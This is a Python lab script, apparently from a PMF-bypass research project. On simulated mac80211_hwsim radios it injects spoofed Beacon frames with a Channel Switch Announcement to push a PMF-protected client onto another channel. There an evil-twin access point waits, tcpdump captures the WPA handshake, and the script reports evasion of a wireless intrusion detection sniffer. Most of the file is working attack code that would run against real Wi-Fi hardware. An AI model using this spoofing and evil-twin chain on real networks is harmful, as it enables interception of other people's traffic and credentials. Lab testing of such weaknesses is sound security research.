#!/usr/bin/env python3
"""
Direct hwsim CSA Injection Test — NO Mininet-WiFi dependency
=============================================================

Architecture:
    mac80211_hwsim (radios=4+)
    ├── Radio 0 → hostapd (AP, channel 6, PMF=required)
    ├── Radio 1 → wpa_supplicant (STA, connects to Radio 0)
    ├── Radio 2 → monitor mode (scapy Beacon CSA injection)
    └── wmediumd → channel separation model

Key difference from Mininet-WiFi approach:
    - Real 802.11 Auth/Assoc handshake through kernel (cfg80211/mac80211)
    - Kernel tracks association → cfg80211_ch_switch_notify() fires on CSA
    - wmediumd enforces channel separation → station loses connectivity on switch

Usage:
    sudo python3 raport/direct_hwsim_csa.py
    sudo python3 raport/direct_hwsim_csa.py --hostapd-ver 2.6
    sudo python3 raport/direct_hwsim_csa.py --hostapd-ver 2.10 --no-wmediumd
    sudo python3 raport/direct_hwsim_csa.py --evil-channel 11 --beacon-count 50

Prerequisites on Kali VM:
    - mac80211_hwsim kernel module
    - hostapd (2.6 in /opt/hostapd-2.6/ or 2.10 system)
    - wpa_supplicant (system)
    - wmediumd (installed from ramonfontes/wmediumd, branch mininet-wifi)
    - scapy (pip3 install scapy)
"""

import argparse
import os
import re
import signal
import subprocess
import sys
import time
from datetime import datetime
from pathlib import Path

# ─── Constants ─────────────────────────────────────────────────────────────────
SSID = "CSA_Test_Lab"
PASSPHRASE = "LabTest123!"
LEGIT_CHANNEL = 6
EVIL_CHANNEL = 11
IFACE_AP = None   # discovered dynamically
IFACE_STA = None
IFACE_INJ = None

# Paths
HOSTAPD_26_BIN = "/opt/hostapd-2.6/bin/hostapd"
HOSTAPD_SYS_BIN = "/usr/sbin/hostapd"
HOSTAPD_CLI = "/usr/sbin/hostapd_cli"
WPAS_BIN = "/sbin/wpa_supplicant"
WMEDIUMD_BIN = "/usr/bin/wmediumd"

RAPORT_DIR = Path(__file__).parent
TMP_DIR = Path("/tmp/direct_hwsim_csa")
TMP_DIR.mkdir(parents=True, exist_ok=True)

HOSTAPD_PID = None
WPAS_PID = None
WMEDIUMD_PID = None


# ─── Helpers ───────────────────────────────────────────────────────────────────
def ts():
    return datetime.now().strftime("%H:%M:%S")

def log(msg):
    print(f"[{ts()}] {msg}", flush=True)

def run(cmd, shell=True, capture=True, timeout=30):
    """Run a shell command, return stdout or raise on failure."""
    if capture:
        r = subprocess.run(cmd, shell=shell, capture_output=True, text=True,
                           timeout=timeout)
        return r.stdout.strip(), r.stderr.strip(), r.returncode
    else:
        return subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE,
                                stderr=subprocess.STDOUT, text=True)

def sudo(cmd, capture=True, timeout=30):
    return run(f"sudo {cmd}", capture=capture, timeout=timeout)

def cleanup():
    """Stop all processes and unload hwsim."""
    log("=== CLEANUP ===")
    for pid_var, name in [(HOSTAPD_PID, "hostapd"), (WPAS_PID, "wpa_supplicant"),
                           (WMEDIUMD_PID, "wmediumd")]:
        if pid_var:
            try:
                os.kill(pid_var, signal.SIGTERM)
            except (ProcessLookupError, TypeError):
                pass
    sudo("pkill -f hostapd 2>/dev/null || true")
    sudo("pkill -f wpa_supplicant 2>/dev/null || true")
    sudo("pkill -f wmediumd 2>/dev/null || true")
    time.sleep(1)
    sudo("modprobe -r mac80211_hwsim 2>/dev/null || true")
    log("Cleanup done.")


# ─── Interface Discovery ──────────────────────────────────────────────────────
def load_hwsim(radios=4):
    """Load mac80211_hwsim and return list of interface names."""
    sudo("modprobe -r mac80211_hwsim 2>/dev/null || true")
    time.sleep(0.5)
    out, err, rc = sudo(f"modprobe mac80211_hwsim radios={radios}")
    time.sleep(1.5)

    # Discover interfaces
    out, _, _ = sudo("iw dev 2>&1")
    ifaces = []
    for line in out.split("\n"):
        line = line.strip()
        if line.startswith("Interface "):
            ifaces.append(line.split()[1])
    log(f"hwsim interfaces: {ifaces}")
    return ifaces


def discover_roles(ifaces):
    """Assign AP, STA, and Injection roles to interfaces."""
    global IFACE_AP, IFACE_STA, IFACE_INJ

    # We need at least 3 interfaces
    if len(ifaces) < 3:
        raise RuntimeError(f"Need at least 3 hwsim radios, got {len(ifaces)}. "
                           f"Run: sudo modprobe mac80211_hwsim radios=4")

    # Assign: first two for AP/STA, third for injection
    IFACE_AP = ifaces[0]
    IFACE_STA = ifaces[1]
    IFACE_INJ = ifaces[2]

    log(f"AP  interface: {IFACE_AP}")
    log(f"STA interface: {IFACE_STA}")
    log(f"INJ interface: {IFACE_INJ} (monitor mode)")

    return IFACE_AP, IFACE_STA, IFACE_INJ


# ─── wmediumd ──────────────────────────────────────────────────────────────────
def generate_wmediumd_config(ifaces):
    """Generate wmediumd config with all interfaces' MAC addresses."""
    ids_lines = []
    for iface in ifaces:
        out, _, _ = run(f"ip -c=never link show {iface}")
        m = re.search(r'link/ether ([0-9a-f:]+)', out)
        mac = m.group(1) if m else "02:00:00:00:00:00"
        ids_lines.append(f'\t\t"{mac}"')
    
    config = f"""ifaces : {{
    ids = [
{",\n".join(ids_lines)}
    ];
}};
"""
    cfg_path = "/tmp/wmediumd.cfg"
    with open(cfg_path, "w") as f:
        f.write(config)
    log(f"wmediumd config written: {cfg_path}")
    return cfg_path


def start_wmediumd(ifaces):
    """Start wmediumd for channel separation."""
    global WMEDIUMD_PID

    # Check if wmediumd exists
    out, _, rc = run("which wmediumd 2>/dev/null || echo NOT_FOUND")
    if "NOT_FOUND" in out:
        log("wmediumd not found — skipping channel separation")
        return False

    # Generate config
    generate_wmediumd_config(ifaces)

    # Kill any existing wmediumd
    sudo("pkill -f wmediumd 2>/dev/null || true")
    time.sleep(0.5)

    log("Starting wmediumd...")
    proc = run(f"{WMEDIUMD_BIN} -c /tmp/wmediumd.cfg 2>&1", capture=False)
    WMEDIUMD_PID = proc.pid
    time.sleep(1)

    # Check if running
    out, _, _ = run("pgrep wmediumd 2>/dev/null || echo NOT_RUNNING")
    if "NOT_RUNNING" in out:
        log("WARNING: wmediumd may not have started")
        return False

    log(f"wmediumd running (PID={WMEDIUMD_PID})")
    return True


def stop_wmediumd():
    global WMEDIUMD_PID
    if WMEDIUMD_PID:
        try:
            os.kill(WMEDIUMD_PID, signal.SIGTERM)
        except (ProcessLookupError, TypeError):
            pass
    sudo("pkill -f wmediumd 2>/dev/null || true")


# ─── hostapd ───────────────────────────────────────────────────────────────────
def write_hostapd_conf(iface, channel, pmf=2):
    """Generate temporary hostapd.conf for the test."""
    conf = f"""interface={iface}
driver=nl80211
ssid={SSID}
hw_mode=g
channel={channel}
wpa=2
wpa_passphrase={PASSPHRASE}
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
rsn_pairwise=CCMP
ieee80211w={pmf}
beacon_int=100
dtim_period=2
ctrl_interface=/var/run/hostapd
ctrl_interface_group=0
logger_stdout=-1
logger_stdout_level=2
"""
    conf_path = TMP_DIR / "hostapd.conf"
    conf_path.write_text(conf)
    return conf_path


def start_hostapd(iface, channel, hostapd_ver="2.10"):
    """Start hostapd on the given interface."""
    global HOSTAPD_PID

    conf_path = write_hostapd_conf(iface, channel)

    # Select hostapd binary
    if hostapd_ver == "2.6":
        bin_path = HOSTAPD_26_BIN
    else:
        bin_path = HOSTAPD_SYS_BIN

    if not os.path.exists(bin_path):
        log(f"WARNING: {bin_path} not found, trying system hostapd")
        bin_path = HOSTAPD_SYS_BIN
    if not os.path.exists(bin_path):
        raise RuntimeError("No hostapd binary found")

    log(f"Starting hostapd {hostapd_ver} on {iface} (channel {channel})...")
    # Redirect output to log file for debugging
    logfile = TMP_DIR / "hostapd.log"
    proc = subprocess.Popen(
        f"sudo {bin_path} {conf_path}",
        shell=True, stdout=open(str(logfile), "w"),
        stderr=subprocess.STDOUT
    )
    HOSTAPD_PID = proc.pid
    time.sleep(3)

    # Verify hostapd via iw (more reliable than hostapd_cli)
    out, _, _ = sudo(f"iw dev {iface} info 2>&1")
    if "type AP" in out:
        log(f"hostapd ENABLED on {iface}")
    else:
        log(f"WARNING: hostapd may not be fully started")
        log(f"  iw info: {out[:200]}")

    return HOSTAPD_PID


# ─── wpa_supplicant ───────────────────────────────────────────────────────────
def write_wpa_conf(iface, pmf=2):
    """Generate temporary wpa_supplicant.conf."""
    conf = f"""ctrl_interface=/var/run/wpa_supplicant
update_config=1
country=PL
network={{
    ssid="{SSID}"
    psk="{PASSPHRASE}"
    proto=RSN
    key_mgmt=WPA-PSK
    pairwise=CCMP
    group=CCMP
    ieee80211w={pmf}
}}
"""
    conf_path = TMP_DIR / "wpa_supplicant.conf"
    conf_path.write_text(conf)
    return conf_path


def start_wpa_supplicant(iface, pmf=2):
    """Start wpa_supplicant on the given STA interface."""
    global WPAS_PID

    conf_path = write_wpa_conf(iface, pmf)

    # Clear any leftover state
    sudo(f"iw dev {iface} disconnect 2>/dev/null || true")
    sudo(f"rm -f /var/run/wpa_supplicant/{iface} 2>/dev/null || true")

    log(f"Starting wpa_supplicant on {iface}...")
    logfile = TMP_DIR / "wpa_supplicant.log"
    proc = subprocess.Popen(
        f"sudo {WPAS_BIN} -i {iface} -c {conf_path} -D nl80211",
        shell=True, stdout=open(str(logfile), "w"),
        stderr=subprocess.STDOUT
    )
    WPAS_PID = proc.pid
    time.sleep(3)

    return WPAS_PID


def check_association(iface, timeout=15):
    """Wait for real 802.11 association. Returns (associated, bssid, freq)."""
    log(f"Waiting for association on {iface} (max {timeout}s)...")
    deadline = time.time() + timeout

    while time.time() < deadline:
        out, _, _ = sudo(f"iw dev {iface} link")
        if "Connected to" in out:
            # Parse BSSID and frequency
            bssid = None
            freq = None
            for line in out.split("\n"):
                if "Connected to" in line:
                    bssid = line.strip().split()[-1]
                if "freq:" in line:
                    freq = line.strip().split()[-1]
            log(f"ASSOCIATED: BSSID={bssid}, freq={freq}")
            return True, bssid, freq

        time.sleep(1)

    out, _, _ = sudo(f"iw dev {iface} link")
    log(f"Association timeout. Status: {out[:200]}")
    return False, None, None


def get_sta_channel(iface):
    """Get current channel of a station interface."""
    out, _, _ = sudo(f"iw dev {iface} info")
    for line in out.split("\n"):
        if "channel" in line:
            try:
                return int(line.strip().split()[1])
            except (IndexError, ValueError):
                pass
    return None


# ─── CSA Injection ─────────────────────────────────────────────────────────────
def setup_monitor_mode(iface, channel):
    """Put interface in monitor mode on specified channel."""
    sudo(f"ip link set {iface} down")
    sudo(f"iw dev {iface} set type monitor")
    sudo(f"ip link set {iface} up")
    sudo(f"iw dev {iface} set channel {channel}")
    log(f"{iface} in monitor mode, channel {channel}")


def get_ap_mac(ap_iface):
    """Get MAC address of AP interface."""
    out, _, _ = run(f"ip -c=never link show {ap_iface}")
    m = re.search(r'link/ether ([0-9a-f:]+)', out)
    return m.group(1) if m else "02:00:00:00:00:00"


def inject_beacon_csa(ap_mac, current_ch, evil_ch, iface, count=30, switch_count=1):
    """
    Inject spoofed Beacon frames with CSA IE via scapy.
    Frames are sent from HOST (not inside a namespace).
    """
    from scapy.all import RadioTap, Dot11, Dot11Beacon, Dot11Elt, sendp

    csa_body = bytes([0x01, evil_ch, switch_count])
    frame = RadioTap() / Dot11(
        type=0, subtype=8,
        addr1="ff:ff:ff:ff:ff:ff",
        addr2=ap_mac,
        addr3=ap_mac,
    ) / Dot11Beacon(timestamp=0, beacon_interval=0x0064, cap=0x0431) \
      / Dot11Elt(ID="SSID", info=SSID.encode()) \
      / Dot11Elt(ID="Rates", info=b'\x82\x84\x8b\x96\x0c\x12\x18\x24') \
      / Dot11Elt(ID="DSset", info=bytes([current_ch])) \
      / Dot11Elt(ID=37, info=csa_body)

    log(f"Injecting {count} Beacon CSA frames: ch{current_ch}→ch{evil_ch} "
        f"(switch_count={switch_count}) via {iface}")
    sendp(frame, iface=iface, count=count, inter=0.1, verbose=False)
    log(f"Injection complete: {count} frames sent")


# ─── Main ──────────────────────────────────────────────────────────────────────
def main():
    parser = argparse.ArgumentParser(
        description="Direct hwsim CSA Injection Test (no Mininet-WiFi)"
    )
    parser.add_argument("--hostapd-ver", default="2.10", choices=["2.6", "2.10"],
                        help="hostapd version (default: 2.10)")
    parser.add_argument("--evil-channel", type=int, default=EVIL_CHANNEL,
                        help=f"Target channel for CSA (default: {EVIL_CHANNEL})")
    parser.add_argument("--beacon-count", type=int, default=30,
                        help="Number of Beacon CSA frames to inject")
    parser.add_argument("--no-wmediumd", action="store_true",
                        help="Skip wmediumd (channels not separated)")
    parser.add_argument("--pmf", type=int, default=2, choices=[0, 1, 2],
                        help="PMF mode: 0=disabled, 1=optional, 2=required")
    parser.add_argument("--wait", type=int, default=15,
                        help="Seconds to wait after CSA for channel switch")
    args = parser.parse_args()

    log("=" * 50)
    log("  DIRECT HWSIM CSA INJECTION TEST")
    log(f"  hostapd: {args.hostapd_ver}  PMF: {args.pmf}")
    log(f"  Channel: {LEGIT_CHANNEL} → {args.evil_channel}")
    log("=" * 50)

    # 1. Load hwsim (with pre-cleanup)
    sudo("pkill hostapd 2>/dev/null || true")
    sudo("pkill wpa_supplicant 2>/dev/null || true")
    time.sleep(0.5)
    # Clean stale control sockets
    sudo("rm -f /var/run/wpa_supplicant/* 2>/dev/null || true")
    sudo("rm -f /var/run/hostapd/* 2>/dev/null || true")
    ifaces = load_hwsim(radios=4)
    if len(ifaces) < 3:
        log("ERROR: Need at least 3 hwsim radios. Reloading with 4...")
        ifaces = load_hwsim(radios=4)
    discover_roles(ifaces)

    # Bring interfaces up
    for iface in [IFACE_AP, IFACE_STA, IFACE_INJ]:
        sudo(f"ip link set {iface} up 2>/dev/null || true")

    # 2. Start wmediumd (channel separation)
    if not args.no_wmediumd:
        start_wmediumd(ifaces)

    try:
        # 3. Start hostapd (AP)
        start_hostapd(IFACE_AP, LEGIT_CHANNEL, args.hostapd_ver)

        # 4. Start wpa_supplicant (STA)
        pmf = args.pmf  # Must match between AP and STA
        start_wpa_supplicant(IFACE_STA, pmf=pmf)

        # 5. Wait for real 802.11 association
        associated, bssid, freq = check_association(IFACE_STA, timeout=30)
        if not associated:
            log("FAIL: No association.")
            for name in ["hostapd.log", "wpa_supplicant.log"]:
                lp = TMP_DIR / name
                if lp.exists():
                    log(f"--- {name} ---")
                    log(lp.read_text()[:5000])
            return 1

        # 6. Pre-attack status
        ap_mac = get_ap_mac(IFACE_AP)
        pre_channel = get_sta_channel(IFACE_STA)
        log(f"\n=== PRE-ATTACK STATUS ===")
        log(f"  AP MAC:     {ap_mac}")
        log(f"  BSSID:      {bssid}")
        log(f"  STA channel: {pre_channel}")
        log(f"  Associated:  YES\n")

        # 7. Setup Evil Twin BEFORE CSA injection (so it's ready when station switches)
        evil_result = "SKIPPED"
        pcap_path = None
        ts_str = datetime.now().strftime('%Y%m%d_%H%M%S')
        IFACE_EVIL = ifaces[3] if len(ifaces) >= 4 else None
        
        if IFACE_EVIL:
            sudo(f"ip link set {IFACE_EVIL} up 2>/dev/null || true")
            log(f"\n=== EVIL TWIN SETUP ===")
            log(f"  Evil interface: {IFACE_EVIL} on channel {args.evil_channel}")
            
            # Start tcpdump on injection interface (monitor mode)
            # Save to /tmp/ first — VMware share doesn't sync root-owned files reliably
            pcap_tmp = f"/tmp/handshake_{args.hostapd_ver}_{ts_str}.pcap"
            pcap_path = RAPORT_DIR / "pcaps" / "csa_injection" / f"evil_twin_{args.hostapd_ver}_{ts_str}.pcap"
            log(f"  tcpdump → {pcap_tmp}")
            tcpdump_proc = subprocess.Popen(
                ["sudo", "tcpdump", "-i", IFACE_INJ, "-w", pcap_tmp,
                 "-s", "0", "-I", "not", "port", "22"],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
            )
            time.sleep(1)
            
            # Start Evil Twin AP (PMF=0)
            evil_conf = TMP_DIR / "hostapd_evil.conf"
            evil_conf.write_text(f"""interface={IFACE_EVIL}
driver=nl80211
ssid={SSID}
hw_mode=g
channel={args.evil_channel}
wpa=2
wpa_passphrase={PASSPHRASE}
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
rsn_pairwise=CCMP
ieee80211w=0
beacon_int=100
dtim_period=2
ctrl_interface=/var/run/hostapd_evil
ctrl_interface_group=0
logger_stdout=-1
logger_stdout_level=2
""")
            evil_bin = HOSTAPD_26_BIN if args.hostapd_ver == "2.6" else HOSTAPD_SYS_BIN
            log(f"  Evil Twin AP starting ({args.hostapd_ver}, SSID={SSID})...")
            evil_proc = subprocess.Popen(
                ["sudo", str(evil_bin), str(evil_conf)],
                stdout=open(str(TMP_DIR / "hostapd_evil.log"), "w"),
                stderr=subprocess.STDOUT
            )
            time.sleep(3)
            out, _, _ = sudo(f"iw dev {IFACE_EVIL} info")
            log(f"  Evil Twin: {'READY' if 'type AP' in out else 'FAILED'}")
        
        # 8. Setup injection interface
        setup_monitor_mode(IFACE_INJ, LEGIT_CHANNEL)

        # 8a. Start WIDS sniffer on injection interface (monitor mode)
        wids_pcap = RAPORT_DIR / "pcaps" / "csa_injection" / f"wids_{args.hostapd_ver}_{ts_str}.pcap"
        wids_pcap.parent.mkdir(parents=True, exist_ok=True)
        sniffer_path = RAPORT_DIR.parent / "pmf-bypass-lab-infra" / "wids" / "scapy_sniffer.py"
        if sniffer_path.exists():
            log(f"  WIDS sniffer starting on {IFACE_INJ}...")
            wids_proc = subprocess.Popen(
                ["sudo", "python3", str(sniffer_path),
                 "--iface", IFACE_INJ, "--duration", "90",
                 "--out", str(wids_pcap), "--verbose"],
                stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True
            )
            time.sleep(2)
        else:
            wids_proc = None

        # 9. Inject Beacon CSA (Evil Twin already waiting on evil channel)
        inject_beacon_csa(
            ap_mac, LEGIT_CHANNEL, args.evil_channel,
            IFACE_INJ, count=args.beacon_count, switch_count=1
        )

        # 10. Wait for channel switch + check channel BEFORE disconnect
        log(f"Waiting {args.wait}s for channel switch...")
        time.sleep(args.wait)

        # Check channel BEFORE force-disconnect (disconnect kills the read)
        post_channel = get_sta_channel(IFACE_STA)
        log(f"  Post-CSA channel: {post_channel}")

        # 10a. Simulate physical channel isolation
        # In real WiFi, switching channel physically disconnects from old AP.
        # hwsim shares one virtual medium — force disconnect to simulate this.
        if IFACE_EVIL and post_channel == args.evil_channel:
            sudo(f"iw dev {IFACE_STA} disconnect 2>/dev/null || true")
            log("  Force-disconnect STA (simulating physical channel isolation)")
            time.sleep(2)

        # Post-attack status
        post_associated, _, post_freq = check_association(IFACE_STA, timeout=3)

        log(f"\n=== POST-ATTACK STATUS ===")
        log(f"  STA channel:    {post_channel}")
        log(f"  Associated:     {post_associated}")
        log(f"  Frequency:      {post_freq}")

        # Analysis
        log(f"\n=== ANALYSIS ===")
        if post_channel == args.evil_channel:
            log(f"🎯 SUCCESS: Station switched to evil channel {post_channel}!")
            log(f"   Beacon CSA bypassed PMF on hostapd {args.hostapd_ver}")
            result = "SUCCESS"
        elif post_channel == pre_channel:
            log(f"🛡️ BLOCKED: Station stayed on channel {post_channel}")
            log(f"   PMF on hostapd {args.hostapd_ver} blocked Beacon CSA")
            result = "BLOCKED"
        else:
            log(f"❓ ANOMALY: Unexpected channel {post_channel}")
            result = "ANOMALY"

        # 11. Post-CSA monitoring — wait for station to reassociate to Evil Twin
        if IFACE_EVIL and post_channel == args.evil_channel:
            log(f"\n=== POST-CSA MONITORING ===")
            log(f"  Waiting 25s for station reassociation to Evil Twin...")
            evil_wait = 25
            deadline = time.time() + evil_wait
            evil_associated = False
            was_disconnected = False
            while time.time() < deadline:
                sta_out, _, _ = sudo(f"iw dev {IFACE_STA} link")
                if "Not connected" in sta_out:
                    was_disconnected = True
                if "Connected to" in sta_out and was_disconnected:
                    evil_associated = True
                    bssid = sta_out.split("Connected to")[-1].strip().split()[0]
                    log(f"  🔑 REASSOCIATED! BSSID={bssid}")
                    break
                time.sleep(2)
            
            if evil_associated:
                log(f"  Handshake captured!")
                evil_result = "EVIL_TWIN_SUCCESS"
            elif was_disconnected:
                log(f"  Station disconnected but didn't reconnect to Evil Twin")
                evil_result = "EVIL_TWIN_NO_RECONNECT"
            else:
                log(f"  Station never disconnected")
                evil_result = "EVIL_TWIN_NO_DISCONNECT"
            
            # Stop tcpdump and copy PCAP to share
            tcpdump_proc.terminate()
            try:
                tcpdump_proc.wait(timeout=5)
            except subprocess.TimeoutExpired:
                tcpdump_proc.kill()
            # Copy from /tmp/ to VMware share
            pcap_path.parent.mkdir(parents=True, exist_ok=True)
            if os.path.exists(pcap_tmp) and os.path.getsize(pcap_tmp) > 24:
                subprocess.run(["sudo", "cp", pcap_tmp, str(pcap_path)], capture_output=True)
                log(f"  PCAP: {pcap_path} ({os.path.getsize(pcap_tmp)} bytes)")
            else:
                log(f"  PCAP: empty/missing (tcpdump on injection iface may have captured nothing)")
            
            # WIDS: parse sniffer output for alert-worthy frames
            if wids_proc:
                try:
                    wids_out, _ = wids_proc.communicate(timeout=10)
                except subprocess.TimeoutExpired:
                    wids_proc.kill()
                    wids_out, _ = wids_proc.communicate()
                wids_text = wids_out if wids_out else ""
                deauth_n = wids_text.count("Deauthentication")
                disassoc_n = wids_text.count("Disassociation")
                beacon_n = wids_text.count("Beacon")
                log(f"  WIDS: Beacon={beacon_n} Deauth={deauth_n} Disassoc={disassoc_n}")
                if deauth_n == 0 and disassoc_n == 0:
                    log(f"  ✅ WIDS EVASION: No PMF-alert frames — Beacon CSA is stealthy!")
                log(f"  WIDS PCAP: {wids_pcap}")
        elif not IFACE_EVIL:
            log(f"\n=== EVIL TWIN SKIPPED (need 4 radios, got {len(ifaces)}) ===")
        else:
            log(f"\n=== EVIL TWIN SKIPPED (CSA didn't switch channel) ===")

        # Save log
        log_path = RAPORT_DIR / "logs" / f"direct_csa_{args.hostapd_ver}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        log_path.parent.mkdir(parents=True, exist_ok=True)
        with open(log_path, "w") as f:
            f.write(f"Test: Direct hwsim CSA Injection\n")
            f.write(f"hostapd: {args.hostapd_ver}\n")
            f.write(f"PMF: {args.pmf}\n")
            f.write(f"Legit channel: {LEGIT_CHANNEL}\n")
            f.write(f"Evil channel: {args.evil_channel}\n")
            f.write(f"Beacon count: {args.beacon_count}\n")
            f.write(f"Result: {result}\n")
            f.write(f"Pre channel: {pre_channel} → Post channel: {post_channel}\n")
            f.write(f"Associated after: {post_associated}\n")
            f.write(f"Evil Twin: {evil_result}\n")
            if pcap_path:
                f.write(f"PCAP: {pcap_path}\n")
        log(f"Log saved: {log_path}")

        return 0 if result == "SUCCESS" else 1

    except Exception as e:
        log(f"ERROR: {e}")
        import traceback
        traceback.print_exc()
        return 2
    finally:
        cleanup()


if __name__ == "__main__":
    sys.exit(main())
